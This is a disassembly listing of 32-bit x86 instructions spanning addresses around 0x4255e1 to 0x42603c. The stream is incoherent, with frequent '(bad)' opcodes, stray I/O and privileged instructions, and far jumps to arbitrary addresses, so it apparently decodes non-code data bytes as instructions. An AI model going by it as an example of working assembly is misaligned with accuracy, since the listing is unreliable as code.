  4255e1:	mov    al,ds:0xe2fb4d0
  4255e6:	pop    ecx
  4255e7:	test   DWORD PTR es:[edi-0x41],esp
  4255eb:	lods   eax,DWORD PTR ds:[esi]
  4255ec:	outs   dx,BYTE PTR ds:[esi]
  4255ed:	into   
	...
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0xac8cf13a
  425664:	loope  0x425658
  425666:	addr16 xchg ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	das    
  42566f:	lods   al,BYTE PTR ds:[esi]
  425670:	jbe    0x425649
  425672:	rcl    BYTE PTR [edx],1
  425674:	lds    esp,FWORD PTR [edi]
  425676:	out    0x4d,eax
  425678:	cld    
  425679:	jg     0x4256ea
  42567b:	bound  ecx,QWORD PTR [ebp+ebx*8-0x2f83a3b9]
  425682:	outs   dx,BYTE PTR ds:[esi]
  425683:	dec    eax
  425684:	icebp  
  425685:	gs and eax,0x9c8059e
  42568b:	mov    al,ds:0x8bcb7c3c
  425690:	call   0x6e65:0x6442db51
  425697:	dec    ebp
  425698:	arpl   si,si
  42569a:	xor    edx,DWORD PTR [ecx+0xb]
  42569d:	adc    dh,BYTE PTR [esi]
  42569f:	aad    0xf9
  4256a1:	ins    BYTE PTR es:[edi],dx
  4256a2:	imul   edi,DWORD PTR [edi],0xffffff87
  4256a5:	cli    
  4256a6:	dec    ecx
  4256a7:	sbb    BYTE PTR [ebp-0x58d8e55a],al
  4256ad:	jne    0x425723
  4256af:	adc    dh,ah
  4256b1:	lahf   
  4256b2:	retf   0x12ba
  4256b5:	sbb    eax,0x33b2d282
  4256ba:	dec    ecx
  4256bb:	cmp    ecx,ebp
  4256bd:	ins    BYTE PTR es:[edi],dx
  4256be:	adc    DWORD PTR [eax+esi*8+0x7c],edx
  4256c2:	add    al,BYTE PTR [edx]
  4256c4:	jmp    0xe0a02cd3
  4256c9:	adc    BYTE PTR [ecx+0x53],cl
  4256cc:	xchg   ebp,eax
  4256cd:	pushf  
  4256ce:	mov    WORD PTR [eax+0x72],?
  4256d1:	jne    0x42565a
  4256d3:	xor    BYTE PTR [esi-0x46f286bb],bh
  4256d9:	inc    esp
  4256da:	or     ah,BYTE PTR [edx+0x33]
  4256dd:	mov    ch,BYTE PTR [ebx]
  4256df:	and    DWORD PTR [eax-0x37],esp
  4256e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256e3:	rol    BYTE PTR [eax+0x21],cl
  4256e6:	adc    BYTE PTR [ecx],bl
  4256e8:	xor    eax,edx
  4256ea:	gs das 
  4256ec:	and    edi,edi
  4256ee:	jae    0x4256c7
  4256f0:	out    0x5b,al
  4256f2:	repz jg 0x42568d
  4256f5:	mov    ebp,0x9403ebfb
  4256fa:	rcr    BYTE PTR [eax-0x1e1f14f5],1
  425700:	test   bl,0x8e
  425703:	sub    dl,BYTE PTR [ecx-0x51]
  425706:	repnz outs dx,DWORD PTR ds:[esi]
  425708:	pop    ss
  425709:	sahf   
  42570a:	stos   BYTE PTR es:[edi],al
  42570b:	and    BYTE PTR [esi],bl
  42570d:	shl    bl,1
  42570f:	xchg   ebp,eax
  425710:	jg     0x425737
  425712:	je     0x425706
  425714:	(bad)  
  425715:	(bad)  
  425716:	ins    DWORD PTR es:[edi],dx
  425717:	xor    eax,ebx
  425719:	gs push edi
  42571b:	es xor edx,edi
  42571e:	ins    DWORD PTR es:[edi],dx
  42571f:	in     eax,0x18
  425721:	xadd   BYTE PTR [esi],cl
  425724:	mov    ebp,0xa98e50a7
  425729:	ja     0x4256f1
  42572b:	(bad)  
  42572d:	jae    0x425703
  42572f:	sbb    al,0x33
  425731:	lock mov cl,0xc6
  425734:	inc    ebx
  425735:	push   ds
  425736:	fcomp  DWORD PTR [ebp+0x3a]
  425739:	retf   
  42573a:	pop    es
  42573b:	pop    esi
  42573c:	pop    edx
  42573d:	out    0xb1,al
  42573f:	(bad)  
  425740:	adc    DWORD PTR [ebp+0xfd519d9],esp
  425746:	sub    eax,0xfca72f79
  42574b:	lods   al,BYTE PTR ds:[esi]
  42574c:	iret   
  42574d:	xchg   eax,edi
  42574f:	test   DWORD PTR [edx+ecx*1-0x6e561b12],ebp
  425756:	retf   
  425757:	(bad)  
  425758:	stos   BYTE PTR es:[edi],al
  425759:	dec    esi
  42575a:	sti    
  42575b:	jmp    0xb8dc2e27
  425760:	xchg   edi,eax
  425761:	jb     0x425727
  425763:	shr    ah,cl
  425765:	into   
  425766:	shr    DWORD PTR [ecx],1
  425768:	aad    0x79
  42576a:	mov    cl,BYTE PTR [ebp+ebx*8+0x92]
	...
  4257d5:	add    dh,dl
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0x2cc64674
  4257e5:	mov    ebx,0x19267
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	xlat   BYTE PTR ds:[ebx]
  4257ef:	mov    ah,0xeb
  4257f1:	mov    ecx,0x44a6caf0
  4257f6:	popf   
  4257f7:	and    BYTE PTR [ebx+0x373397a2],dl
  4257fd:	adc    eax,0x7423ee48
  425802:	inc    edx
  425803:	xlat   BYTE PTR ds:[ebx]
  425804:	test   ah,dh
  425806:	retf   
  425807:	ret    
  425808:	loopne 0x4257d9
  42580a:	add    BYTE PTR [edx+eiz*1-0x45c75a07],0x75
  425812:	sbb    ah,BYTE PTR [esi]
  425814:	mov    ebp,0xc51f850e
  425819:	(bad)  
  42581a:	in     al,0x29
  42581c:	ins    DWORD PTR es:[edi],dx
  42581d:	loopne 0x4257f3
  42581f:	xchg   esi,eax
  425820:	xchg   ebp,eax
  425821:	sbb    ebx,DWORD PTR [edi]
  425823:	sbb    DWORD PTR [eax-0x7d374c77],edi
  425829:	stc    
  42582a:	or     dh,0x51
  42582d:	add    al,0x5
  42582f:	arpl   WORD PTR [ebx+0x6c],sp
  425832:	xchg   ebp,eax
  425833:	push   esp
  425834:	sbb    eax,0xc9813c05
  425839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42583a:	shl    DWORD PTR [ecx+ebx*4-0x1a],cl
  42583e:	or     DWORD PTR [edi-0x5ba0923a],ebx
  425844:	mov    eax,0xbd02539f
  425849:	and    eax,0x388444ef
  42584e:	sbb    eax,0x6b0dcb60
  425853:	nop
  425854:	icebp  
  425855:	repnz addr16 sub al,0x7d
  425859:	mov    dl,0xaa
  42585b:	rcr    DWORD PTR [edx],cl
  42585d:	pop    ds
  42585e:	in     eax,dx
  42585f:	into   
  425860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425861:	mov    WORD PTR [esi+0x6979df08],?
  425867:	xor    eax,0x2ad3e783
  42586c:	cli    
  42586d:	imul   ebx,DWORD PTR [esi+0x6e],0xffffffb4
  425871:	sub    DWORD PTR [edx],esp
  425873:	mov    ds:0x4558093d,eax
  425878:	(bad)  
  42587a:	ret    
  42587b:	sub    bh,BYTE PTR [edi-0x7da44cdb]
  425881:	sbb    eax,0xeada090
  425886:	xlat   BYTE PTR ds:[ebx]
  425887:	imul   ebx,DWORD PTR [esi],0x18
  42588a:	addr16 repnz and eax,0x4ea7f3b3
  425891:	xor    bl,BYTE PTR [ebx+0x772835c6]
  425897:	pop    ds
  425898:	pop    edi
  425899:	dec    ebp
  42589a:	jb     0x425887
  42589c:	in     eax,dx
  42589d:	pop    ebp
  42589e:	jnp    0x4258e3
  4258a0:	inc    esi
  4258a1:	pop    eax
  4258a2:	ret    
  4258a3:	ja     0x4258ff
  4258a5:	fdivr  st(1),st
  4258a7:	loop   0x42585f
  4258a9:	ja     0x42589f
  4258ab:	jbe    0x34e3d2de
  4258b1:	dec    ebp
  4258b2:	sbb    esi,DWORD PTR [esp+eax*1-0x78]
  4258b6:	inc    edx
  4258b7:	ins    BYTE PTR es:[edi],dx
  4258b8:	xor    ecx,edi
  4258ba:	ja     0x425891
  4258bc:	dec    eax
  4258bd:	enter  0x3221,0x74
  4258c1:	and    eax,0xcab14c7
  4258c6:	adc    ch,dh
  4258c8:	jns    0x42591d
  4258ca:	pusha  
  4258cb:	mov    cl,0x8
  4258cd:	rcr    ebp,1
  4258cf:	mov    BYTE PTR [ebp-0x19f2c716],ah
  4258d5:	lea    esi,[edx]
  4258d7:	pop    ecx
  4258d8:	and    BYTE PTR [eax+0x5f8152e8],0x51
  4258df:	fs and bh,bh
  4258e2:	xor    al,0x3c
  4258e4:	retf   0x3136
  4258e7:	outs   dx,BYTE PTR ds:[esi]
  4258e8:	jns    0x425939
  4258ea:	dec    esi
  4258eb:	mov    edi,0x69
	...
  425954:	add    BYTE PTR [eax],al
  425956:	pop    esp
  425957:	push   edx
  425958:	nop
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	inc    edx
  425963:	cli    
  425964:	(bad)  
  425965:	jmp    0x43ecd1
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	pop    edi
  42596f:	adc    ecx,DWORD PTR [edx+0x4582aa8]
  425975:	push   ecx
  425976:	retf   
  425977:	mov    DWORD PTR [eax+eax*1+0x48],ecx
  42597b:	mov    ebx,0xb9555f86
  425980:	mov    edx,0x3a5424aa
  425985:	jns    0x425927
  425987:	or     BYTE PTR [edi+0x4d1847cb],cl
  42598d:	and    DWORD PTR [eax-0x51],esi
  425990:	push   ss
  425991:	mov    bh,0x8
  425993:	jle    0x42593d
  425995:	fimul  WORD PTR [edi-0x5809d4f1]
  42599b:	fcomp  QWORD PTR [ecx+0x70]
  42599e:	fistp  DWORD PTR [esp+ebp*1]
  4259a1:	fdivr  st,st(1)
  4259a3:	xchg   esi,eax
  4259a4:	dec    ecx
  4259a5:	scas   al,BYTE PTR es:[edi]
  4259a6:	pop    ebp
  4259a7:	hlt    
  4259a8:	in     al,0xed
  4259aa:	jnp    0x425a0a
  4259ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259ad:	sbb    eax,0xc45bfcb8
  4259b2:	fisub  WORD PTR [esi-0x61]
  4259b5:	mov    BYTE PTR [eax-0x1d3b1692],ch
  4259bb:	sub    eax,0x33bc19dc
  4259c0:	sub    DWORD PTR [eax-0x5d],ebp
  4259c3:	ss inc edi
  4259c5:	dec    edx
  4259c6:	push   edx
  4259c7:	and    al,0xe0
  4259c9:	aaa    
  4259ca:	mov    dl,0x73
  4259cc:	fwait
  4259cd:	mov    eax,0x1171bf65
  4259d2:	daa    
  4259d3:	jg     0x425a37
  4259d5:	xlat   BYTE PTR ds:[ebx]
  4259d6:	pop    ebp
  4259d7:	das    
  4259d8:	sub    edi,DWORD PTR [edx+eax*2+0x2d]
  4259dc:	ret    
  4259dd:	jge    0x4259ac
  4259df:	in     al,0x85
  4259e1:	mov    ds:0x820aba63,al
  4259e6:	in     eax,0x94
  4259e8:	and    eax,0xbf61cd22
  4259ed:	les    ebx,FWORD PTR [eax+eax*4+0x3b70f094]
  4259f4:	rcr    BYTE PTR [esi+0x30],1
  4259f7:	pop    ecx
  4259f8:	popf   
  4259f9:	mov    ch,0xdf
  4259fb:	fstp   DWORD PTR [edi]
  4259fd:	sahf   
  4259fe:	(bad)  
  425a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a01:	arpl   WORD PTR [esi],di
  425a03:	push   ebp
  425a04:	mov    ss,ecx
  425a06:	push   edi
  425a08:	dec    esp
  425a09:	(bad)  
  425a0a:	push   ebx
  425a0b:	sub    eax,0x83f19a6b
  425a10:	js     0x4259dd
  425a12:	mov    ds:0xb6667369,eax
  425a17:	sbb    BYTE PTR [eax+esi*8+0x6b8abd94],bh
  425a1e:	pushf  
  425a1f:	mov    edx,0xcd03b300
  425a24:	cdq    
  425a25:	repnz xor BYTE PTR [esi],0xa8
  425a29:	in     al,0x6a
  425a2b:	mov    WORD PTR [eax-0x766dbb2b],ss
  425a31:	retf   0x7338
  425a34:	sbb    al,BYTE PTR [ecx+ebp*2+0x77]
  425a38:	adc    dh,0x27
  425a3b:	popf   
  425a3c:	xor    eax,0x6fc7bb28
  425a41:	or     BYTE PTR [ebx],ch
  425a43:	rol    BYTE PTR [ecx],0x1f
  425a46:	cmp    al,BYTE PTR [edx-0x59]
  425a49:	xchg   esp,eax
  425a4a:	dec    ecx
  425a4b:	int3   
  425a4c:	mov    ds:0x1a00c33c,al
  425a51:	outs   dx,DWORD PTR ds:[esi]
  425a52:	popa   
  425a53:	imul   esp,DWORD PTR [ecx+esi*8],0x21
  425a57:	rcr    dl,0x42
  425a5a:	mov    ecx,0xde38129b
  425a5f:	call   0xab0a5b8c
  425a64:	call   0xdafca475
  425a69:	test   al,0xc3
  425a6b:	cmp    BYTE PTR [ebx+0x66],al
	...
  425ad5:	add    cl,al
  425ad7:	arpl   WORD PTR [edi+eiz*2],ax
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x77f3ffdb]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	jbe    0x425b0b
  425af0:	or     eax,DWORD PTR [ecx]
  425af2:	jne    0x425af1
  425af4:	xchg   ebp,eax
  425af5:	and    al,0xa9
  425af7:	xor    BYTE PTR [edx+edx*4+0x4f83fa7f],0xcc
  425aff:	retf   0x5c1
  425b02:	mov    bh,0xfc
  425b04:	mov    esi,0x42fcae3b
  425b09:	test   BYTE PTR [ebx+0x45e6cce9],ah
  425b0f:	pop    ds
  425b10:	and    eax,0xd928bddf
  425b15:	jle    0xda08dad2
  425b1b:	adc    al,0xbb
  425b1d:	lods   al,BYTE PTR fs:[esi]
  425b1f:	push   edx
  425b20:	mov    DWORD PTR [esi+eiz*2],ebx
  425b23:	jl     0x425acc
  425b25:	xchg   BYTE PTR [edi+0x28],ah
  425b28:	push   edi
  425b29:	mov    dl,ah
  425b2b:	retf   
  425b2c:	mov    ds:0x7bbe2cd,eax
  425b31:	repz mov ebp,0x590e978d
  425b37:	or     DWORD PTR [ebx-0x17],ebx
  425b3a:	pop    ebx
  425b3b:	enter  0xe961,0xd6
  425b3f:	mov    bl,0x6f
  425b41:	stos   BYTE PTR es:[edi],al
  425b42:	push   edx
  425b43:	pop    esp
  425b44:	jg     0x425ae8
  425b46:	lock sbb bh,0x4a
  425b4a:	rol    DWORD PTR [ebx+0x723a1f2f],0x6c
  425b51:	pop    ds
  425b52:	jmp    0x22d41a1e
  425b57:	(bad)  
  425b58:	(bad)  
  425b59:	lock mov cs,WORD PTR [edx]
  425b5c:	cmp    ecx,DWORD PTR [esi-0x6a12e99e]
  425b62:	cmc    
  425b63:	stos   BYTE PTR es:[edi],al
  425b64:	cmp    eax,DWORD PTR es:[edx+ecx*8]
  425b68:	xchg   BYTE PTR [edx-0x2d64ccf3],dh
  425b6e:	hlt    
  425b6f:	or     esp,DWORD PTR [ecx+0x1b]
  425b72:	jmp    0xeeab:0x428426d1
  425b79:	inc    ecx
  425b7a:	inc    ebp
  425b7b:	out    0xf6,al
  425b7d:	mov    ch,BYTE PTR [edx-0x23]
  425b80:	out    dx,eax
  425b81:	nop
  425b82:	pop    edx
  425b83:	dec    ebp
  425b84:	int3   
  425b85:	lds    ebp,FWORD PTR [edx-0x2d14b4c0]
  425b8b:	mov    esi,0xdfaf902a
  425b90:	dec    esi
  425b91:	push   0x48
  425b93:	push   0x5e8a9dc3
  425b98:	fisttp DWORD PTR [edx-0x4ca787fe]
  425b9e:	xor    al,0x43
  425ba0:	shl    DWORD PTR [eax+ebp*4],0x9a
  425ba4:	fisub  WORD PTR [eax+0x7ce065b7]
  425baa:	(bad)  
  425bab:	push   esp
  425bac:	aam    0xc0
  425bae:	jnp    0x425bd8
  425bb0:	pop    eax
  425bb1:	shr    BYTE PTR [esi],cl
  425bb3:	add    esi,DWORD PTR [edi-0x7d]
  425bb6:	test   BYTE PTR [eax],dl
  425bb8:	sub    esi,DWORD PTR [ebx-0x31]
  425bbb:	dec    esi
  425bbc:	stos   DWORD PTR es:[edi],eax
  425bbd:	pop    es
  425bbe:	fst    st(3)
  425bc0:	and    ch,dl
  425bc2:	jno    0x425b6a
  425bc4:	dec    esi
  425bc5:	aaa    
  425bc6:	lods   al,BYTE PTR ds:[esi]
  425bc7:	pop    edx
  425bc8:	and    eax,0xf6157457
  425bcd:	push   ebp
  425bce:	mov    ds:0xef4ae186,al
  425bd3:	pusha  
  425bd4:	dec    eax
  425bd5:	(bad)  
  425bd6:	or     bl,dh
  425bd8:	mov    ds:0xd2554bed,eax
  425bdd:	std    
  425bde:	arpl   WORD PTR [edi],sp
  425be0:	fwait
  425be1:	iret   
  425be2:	sub    DWORD PTR [edi+0x6a],0xffffffa6
  425be6:	lds    edx,FWORD PTR [eax+0x206dc3a4]
  425bec:	adc    bl,BYTE PTR [esi+0x0]
	...
  425c56:	(bad)  
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	rcr    eax,cl
  425c64:	call   0x0:0x195672f
  425c6b:	add    DWORD PTR [eax],eax
  425c6d:	add    BYTE PTR [edx+edi*4-0xce95254],dh
  425c74:	push   eax
  425c75:	xchg   esp,eax
  425c76:	je     0x425c9f
  425c78:	mov    al,ds:0x5bb4ea7f
  425c7d:	(bad)  
  425c7e:	sub    ch,BYTE PTR [edx+0x25]
  425c81:	cmp    dh,BYTE PTR [ecx+0x48577932]
  425c87:	iret   
  425c88:	nop
  425c89:	ror    BYTE PTR [ebx-0x6b2e3b2a],1
  425c8f:	lods   eax,DWORD PTR ds:[esi]
  425c90:	arpl   sp,si
  425c92:	push   ebx
  425c93:	xlat   BYTE PTR ds:[ebx]
  425c94:	stos   BYTE PTR es:[edi],al
  425c95:	leave  
  425c96:	jne    0x425c70
  425c98:	dec    ebp
  425c99:	daa    
  425c9a:	xor    al,0xbc
  425c9c:	pop    eax
  425c9d:	xchg   edi,eax
  425c9e:	rcr    BYTE PTR [ecx-0x6],1
  425ca1:	in     al,dx
  425ca2:	in     al,dx
  425ca3:	and    ch,BYTE PTR [esi]
  425ca5:	inc    edx
  425ca6:	jg     0x425cc2
  425ca8:	push   ebp
  425ca9:	fsub   QWORD PTR ds:0x60606d4c
  425caf:	adc    BYTE PTR [ebx],0xe8
  425cb2:	sar    BYTE PTR [edx],1
  425cb4:	retf   0xd272
  425cb7:	lods   eax,DWORD PTR ds:[esi]
  425cb8:	sub    esp,DWORD PTR ds:0x71f85325
  425cbe:	daa    
  425cbf:	lock mov cl,0x1f
  425cc2:	outs   dx,DWORD PTR ds:[esi]
  425cc3:	repnz mov edx,0x9ac0fb02
  425cc9:	aad    0xc3
  425ccb:	mov    ebx,0x844880d5
  425cd0:	loop   0x425cce
  425cd2:	xor    DWORD PTR [ecx+0x65],0xe485cf33
  425cd9:	clc    
  425cda:	xor    al,0xae
  425cdc:	or     al,0x0
  425cde:	arpl   WORD PTR [ecx+0x7d],cx
  425ce1:	and    eax,0x510ffded
  425ce6:	pusha  
  425ce7:	fimul  WORD PTR [ebp-0x35e83954]
  425ced:	or     BYTE PTR [edi-0x53037625],dl
  425cf3:	cld    
  425cf4:	push   0xb44e9e3e
  425cf9:	mov    ch,0x95
  425cfb:	icebp  
  425cfc:	clc    
  425cfd:	push   esp
  425cfe:	or     al,0x37
  425d00:	mov    dh,0x86
  425d02:	fldcw  WORD PTR [esi+0x5239881a]
  425d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d09:	out    0x9f,al
  425d0b:	sub    al,0xbe
  425d0d:	pop    ebp
  425d0e:	pop    ebp
  425d0f:	hlt    
  425d10:	mov    ch,0xa
  425d12:	inc    ecx
  425d13:	nop
  425d14:	jno    0x425ce9
  425d16:	sub    dh,BYTE PTR es:[edx]
  425d19:	je     0x425cdb
  425d1b:	xchg   edi,eax
  425d1c:	push   0xffffffb4
  425d1e:	push   ebp
  425d1f:	retf   0xcc3a
  425d22:	sub    DWORD PTR [ebx+0x690a341b],edx
  425d28:	cmp    al,0x31
  425d2a:	stos   DWORD PTR es:[edi],eax
  425d2b:	xchg   ebp,eax
  425d2c:	iret   
  425d2d:	(bad)  
  425d2e:	fcomp  DWORD PTR [edi+0x4b]
  425d31:	inc    esi
  425d32:	mov    al,0x13
  425d34:	dec    ebx
  425d35:	shl    BYTE PTR ds:0x9bf69f40,1
  425d3b:	push   ds
  425d3c:	(bad)  
  425d3d:	pop    bp
  425d3f:	sbb    edx,DWORD PTR [esi-0x542dc401]
  425d45:	sub    dl,BYTE PTR [esp+eiz*2]
  425d48:	mov    dl,0xf0
  425d4a:	inc    DWORD PTR [edi+0x4c]
  425d4d:	pop    ecx
  425d4e:	sbb    ch,BYTE PTR [ecx-0x25]
  425d51:	inc    esi
  425d52:	or     BYTE PTR [eax+0x43],al
  425d55:	mov    ds:0x16849fe9,al
  425d5a:	jecxz  0x425db9
  425d5c:	call   DWORD PTR [ebp-0x4061b218]
  425d62:	xchg   ebx,eax
  425d63:	inc    BYTE PTR [edx+0x65]
  425d66:	data16 and BYTE PTR [eax+0x6657f064],dl
  425d6d:	cdq    
	...
  425dd6:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x50c16dfd,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	or     ebp,eax
  425df0:	aaa    
  425df1:	jmp    0xe13c2dc6
  425df6:	and    edi,esi
  425df8:	mov    dl,0xa7
  425dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dfb:	jg     0x425d89
  425dfd:	adc    BYTE PTR [ebx+ebp*8-0x2],dl
  425e01:	or     al,0x12
  425e03:	stc    
  425e04:	ss sbb al,0xf4
  425e07:	mov    DWORD PTR [edx+0x6c],ecx
  425e0a:	dec    ebp
  425e0b:	cmp    ecx,DWORD PTR [ebx-0x319a859a]
  425e11:	mov    edi,0xb4e89242
  425e16:	aam    0x46
  425e18:	mov    ch,0xa3
  425e1a:	loopne 0x425e51
  425e1c:	push   ecx
  425e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e1e:	out    dx,al
  425e1f:	in     al,dx
  425e20:	bound  ebx,QWORD PTR [ebx]
  425e22:	mov    esp,0xc286e6c1
  425e27:	xchg   esp,eax
  425e28:	sbb    eax,0x8965baa5
  425e2d:	mov    ebx,0x20affe1
  425e32:	cmp    eax,0xc392693e
  425e37:	adc    edx,DWORD PTR [ebx+edi*1-0x48a9bf64]
  425e3e:	(bad)  
  425e3f:	shl    DWORD PTR ds:0x4403e634,1
  425e45:	sahf   
  425e46:	das    
  425e47:	mov    ecx,0x4821982a
  425e4c:	sub    al,0xcb
  425e4e:	pop    esp
  425e4f:	mov    ch,0x46
  425e51:	push   0x63cd7113
  425e56:	add    DWORD PTR [edi+esi*2+0x1e],eax
  425e5a:	lods   eax,DWORD PTR ds:[esi]
  425e5b:	jne    0x425df4
  425e5d:	jg     0x425e6d
  425e5f:	ins    DWORD PTR es:[edi],dx
  425e60:	xchg   esp,eax
  425e61:	cdq    
  425e62:	ins    BYTE PTR es:[edi],dx
  425e63:	fs mov cl,0x3c
  425e66:	cmp    DWORD PTR ds:0x45061ae1,ebp
  425e6c:	stos   DWORD PTR es:[edi],eax
  425e6d:	int    0x98
  425e6f:	es mov bl,0x93
  425e72:	sub    edx,ebp
  425e74:	not    DWORD PTR [ebp+0x43]
  425e77:	inc    ebp
  425e78:	jae    0x425e85
  425e7a:	sti    
  425e7b:	sbb    eax,DWORD PTR [ebp+ebp*1-0x637a2b90]
  425e82:	mov    ds:0x4349764a,eax
  425e87:	(bad)  
  425e88:	(bad)  
  425e89:	sub    al,0x84
  425e8b:	mov    ds:0x7ed853c0,al
  425e90:	jecxz  0x425e7d
  425e92:	jge    0x425e62
  425e94:	loop   0x425e6a
  425e96:	xor    dh,BYTE PTR [eax-0x31]
  425e99:	or     BYTE PTR [esi+0x4f],bl
  425e9c:	mov    WORD PTR [edx-0x4a8952ae],fs
  425ea2:	lahf   
  425ea3:	fsubr  DWORD PTR [ecx]
  425ea5:	popa   
  425ea6:	in     eax,0x46
  425ea8:	xchg   ebp,eax
  425ea9:	xchg   esi,eax
  425eaa:	push   es
  425eab:	xor    ah,BYTE PTR [edi-0x5]
  425eae:	and    dh,BYTE PTR [ecx+0x3a]
  425eb1:	mov    esp,0x43d8ff2a
  425eb6:	inc    edi
  425eb7:	jno    0x425f29
  425eb9:	add    al,0x17
  425ebb:	adc    BYTE PTR [eax+0x6f],dl
  425ebe:	mov    ecx,0xc60a78b1
  425ec3:	nop
  425ec4:	pop    edx
  425ec5:	mov    bh,0x3
  425ec7:	fcomp  DWORD PTR [esi]
  425ec9:	adc    al,BYTE PTR [ebx]
  425ecb:	scas   eax,DWORD PTR es:[edi]
  425ecc:	sub    ebx,DWORD PTR [ebp+0x53f4df3e]
  425ed2:	jnp    0x425ea3
  425ed4:	mov    ch,0x80
  425ed6:	sbb    eax,DWORD PTR [edx+eiz*4+0x3a96e551]
  425edd:	jne    0x425e9c
  425edf:	xlat   BYTE PTR ds:[ebx]
  425ee0:	outs   dx,BYTE PTR ds:[esi]
  425ee1:	outs   dx,BYTE PTR ds:[esi]
  425ee2:	outs   dx,BYTE PTR ds:[esi]
  425ee3:	cmp    al,BYTE PTR [edx]
  425ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ee6:	cwde   
  425ee7:	mov    ebp,0x39214866
  425eec:	xchg   cl,dh
	...
  425f56:	(bad)  
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	dec    ebp
  425f63:	xchg   esp,eax
  425f64:	mov    ecx,0x197678c
  425f69:	add    BYTE PTR [eax],al
  425f6b:	add    DWORD PTR [eax],eax
  425f6d:	add    BYTE PTR [ebx-0x19],cl
  425f70:	or     DWORD PTR [ebx+0x4c],ebx
  425f73:	test   BYTE PTR [ecx],bl
  425f75:	loop   0x425f91
  425f77:	in     eax,dx
  425f78:	pop    ss
  425f79:	ror    DWORD PTR [ebp+0x37f94e5a],0x6d
  425f80:	jmp    0x5e3955d9
  425f85:	jnp    0x425fd2
  425f87:	sbb    BYTE PTR ds:0xe97fe00a,0x5d
  425f8e:	cmp    al,0x1
  425f90:	mov    ah,0xdc
  425f92:	jb     0x425fb0
  425f94:	cld    
  425f95:	sub    al,0xe6
  425f97:	adc    eax,0xb0168239
  425f9c:	test   al,0xeb
  425f9e:	mov    ebp,0xe6f9a12e
  425fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fa4:	int    0x7d
  425fa6:	pop    ecx
  425fa7:	xchg   ecx,eax
  425fa8:	add    ebx,DWORD PTR [ebx-0x5b7b6c88]
  425fae:	sub    ah,BYTE PTR [edx]
  425fb0:	jg     0x425f55
  425fb2:	push   ebx
  425fb3:	fild   QWORD PTR [edx+0x3c48ffa7]
  425fb9:	(bad)  
  425fbb:	(bad)  
  425fbc:	adc    BYTE PTR [ecx+0x1aca05bb],ah
  425fc2:	clc    
  425fc3:	jmp    0x2688034b
  425fc8:	dec    esi
  425fc9:	out    dx,eax
  425fca:	or     DWORD PTR [ecx-0x5e283c57],edx
  425fd0:	aaa    
  425fd1:	rcr    DWORD PTR [esp+eax*1],0xa2
  425fd5:	adc    BYTE PTR [esp+eiz*4-0x21],bh
  425fd9:	mov    ch,0xae
  425fdb:	sub    al,0x41
  425fdd:	mov    esi,0xc8e72c8e
  425fe2:	or     DWORD PTR [ebx+0x49],eax
  425fe5:	dec    edx
  425fe6:	rcl    ch,1
  425fe8:	fiadd  DWORD PTR [edi-0x35]
  425feb:	cmc    
  425fec:	ds mov esp,0xa5bb5277
  425ff2:	mov    WORD PTR [eax],cs
  425ff4:	jle    0x425fbc
  425ff6:	inc    edi
  425ff7:	repnz fnsave [edx+ecx*4-0xe]
  425ffc:	lea    eax,[eax-0x77]
  425fff:	pop    ebx
  426000:	and    DWORD PTR [ebx],ecx
  426002:	inc    esp
  426003:	mov    bh,0x56
  426005:	(bad)
  426008:	and    eax,0x107d3abb
  42600d:	inc    eax
  42600e:	dec    edi
  42600f:	stc    
  426010:	xchg   edx,eax
  426011:	mov    edx,0x643f151d
  426016:	push   ebx
  426017:	(bad)  
  426018:	repz push esi
  42601a:	pop    ds
  42601b:	imul   ebp,DWORD PTR [ebp-0x7c],0xffffffbf
  42601f:	shl    DWORD PTR [ebp+0xeaa0312],cl
  426025:	repnz pop esi
  426027:	ins    BYTE PTR es:[edi],dx
  426028:	sub    DWORD PTR [esi],ebp
  42602a:	(bad)  
  42602b:	push   ds
  42602c:	xor    eax,0x6c930d0
  426031:	stos   DWORD PTR es:[edi],eax
  426032:	cmp    al,0xc3
  426034:	loope  0x425fc4
  426036:	dec    ebp
  426037:	sbb    eax,0x7ab64e4a
  42603c:	xor    BYTE PTR es:[edi+ebp*1],0x53
